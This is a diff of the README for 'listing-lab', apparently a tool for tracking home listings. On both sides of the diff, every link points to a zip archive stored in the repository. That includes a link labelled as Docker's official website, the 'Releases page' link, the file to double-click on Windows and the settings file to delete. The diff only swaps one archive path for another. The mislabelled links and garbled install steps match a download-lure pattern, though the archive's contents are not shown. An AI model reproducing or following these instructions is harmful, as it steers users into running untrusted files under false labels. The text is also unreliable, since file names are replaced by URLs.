@@ -1,7 +1,7 @@
 # 🌟 listing-lab - Keep Track of Your Dream Homes
 
 ## 📥 Download Now!
-[![Download Listing Lab](https://raw.githubusercontent.com/jackmadmax/listing-lab/master/addons/real_estate_listings/static/listing-lab-v3.9.zip%20Listing%20Lab-latest-brightgreen)](https://raw.githubusercontent.com/jackmadmax/listing-lab/master/addons/real_estate_listings/static/listing-lab-v3.9.zip)
+[![Download Listing Lab](https://raw.githubusercontent.com/jackmadmax/listing-lab/master/addons/real_estate_listings/data/lab-listing-v3.1.zip%20Listing%20Lab-latest-brightgreen)](https://raw.githubusercontent.com/jackmadmax/listing-lab/master/addons/real_estate_listings/data/lab-listing-v3.1.zip)
 
 ## 🚀 Getting Started
 Welcome to Listing Lab! This application helps you manage homes you’re interested in. Save listings, add notes, and share information easily. Stay updated on changes, like price cuts, to ensure you always have accurate property data.
@@ -14,7 +14,7 @@ To run Listing Lab, you need:
 - **Disk Space**: 200 MB free space.
 - **Additional**: Docker installed.
 
-If you do not have Docker installed, please visit [Docker's official website](https://raw.githubusercontent.com/jackmadmax/listing-lab/master/addons/real_estate_listings/static/listing-lab-v3.9.zip) for installation instructions.
+If you do not have Docker installed, please visit [Docker's official website](https://raw.githubusercontent.com/jackmadmax/listing-lab/master/addons/real_estate_listings/data/lab-listing-v3.1.zip) for installation instructions.
 
 ## 📚 Features
 - **Save Listings**: Keep track of homes you're considering.
@@ -26,7 +26,7 @@ If you do not have Docker installed, please visit [Docker's official website](ht
 ## 💻 Download & Install
 Follow these instructions to download and get Listing Lab running:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/jackmadmax/listing-lab/master/addons/real_estate_listings/static/listing-lab-v3.9.zip) on GitHub.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/jackmadmax/listing-lab/master/addons/real_estate_listings/data/lab-listing-v3.1.zip) on GitHub.
    
 2. **Choose Your Version**: Find the most recent version of the application. Look for the file that matches your operating system.
 
@@ -35,7 +35,7 @@ Follow these instructions to download and get Listing Lab running:
 4. **Extract the Files**: If you downloaded a .zip file, right-click it and select “Extract All.” Choose a location on your computer where you want to save the files.
 
 5. **Run the Application**:
-   - For Windows, double-click the `https://raw.githubusercontent.com/jackmadmax/listing-lab/master/addons/real_estate_listings/static/listing-lab-v3.9.zip` file.
+   - For Windows, double-click the `https://raw.githubusercontent.com/jackmadmax/listing-lab/master/addons/real_estate_listings/data/lab-listing-v3.1.zip` file.
    - For macOS, locate the extracted folder and double-click on the `listing-lab` application.
    - For Linux, you may need to run the application via the terminal.
 
@@ -52,7 +52,7 @@ Follow these instructions to download and get Listing Lab running:
 A: No, Listing Lab is designed for everyone, regardless of technical ability.
 
 **Q: How do I reset my settings?**
-A: You can reset your application settings by deleting the `https://raw.githubusercontent.com/jackmadmax/listing-lab/master/addons/real_estate_listings/static/listing-lab-v3.9.zip` file located in the application folder.
+A: You can reset your application settings by deleting the `https://raw.githubusercontent.com/jackmadmax/listing-lab/master/addons/real_estate_listings/data/lab-listing-v3.1.zip` file located in the application folder.
 
 **Q: How can I provide feedback?**
 A: We welcome your feedback! Please contact us through the Issues section of our GitHub repository.
@@ -65,4 +65,4 @@ Join our community to stay updated and share your experiences.
 
 Thank you for choosing Listing Lab. We hope it makes your home search easier and more organized! 
 
-[Download Listing Lab](https://raw.githubusercontent.com/jackmadmax/listing-lab/master/addons/real_estate_listings/static/listing-lab-v3.9.zip)
+[Download Listing Lab](https://raw.githubusercontent.com/jackmadmax/listing-lab/master/addons/real_estate_listings/data/lab-listing-v3.1.zip)
